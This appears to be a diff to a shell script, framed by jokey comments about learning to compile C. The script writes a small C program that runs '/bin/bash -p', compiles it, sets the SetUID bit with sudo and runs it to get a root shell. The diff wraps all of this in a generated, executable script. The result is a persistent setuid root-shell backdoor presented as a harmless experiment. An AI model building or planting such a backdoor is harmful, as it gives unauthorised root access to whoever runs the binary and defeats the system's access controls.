@@ -1,9 +1,10 @@
+cat << 'EOF' > /home/coconutrepairs/LibrariesAreWeird.sh
 # LibrariesAreWeird - for once, not a bug!
 
 # First time compiling C ever went well - Bash rules! 
 # Also, kinda forgot GNU_SOURCE was a thing, LOLFAO.
 
-cat << 'EOF' > bash.c
+cat << 'INNER_EOF' > bash.c
 #define _GNU_SOURCE
 #include <unistd.h>
 #include <stdlib.h>
@@ -21,7 +22,7 @@ int main() {
     system("/bin/bash -p"); 
     return 0; 
 }
-EOF
+INNER_EOF
 
 # Ok, yeah, had to Google gcc -o, forgot it was a thing.
 
@@ -37,9 +38,11 @@ sudo chmod u+s LibrariesAreWeird
 
 # Check again - you should see an in there (SetUID)
 ls -l LibrariesAreWeird
+EOF
+
+# Make it executable
+chmod +x /home/coconutrepairs/LibrariesAreWeird.sh
 
 # Run the binary, you should get a (root) shell
-./LibrariesAreWeird
-
-
+./LibrariesAreWeird.sh
 
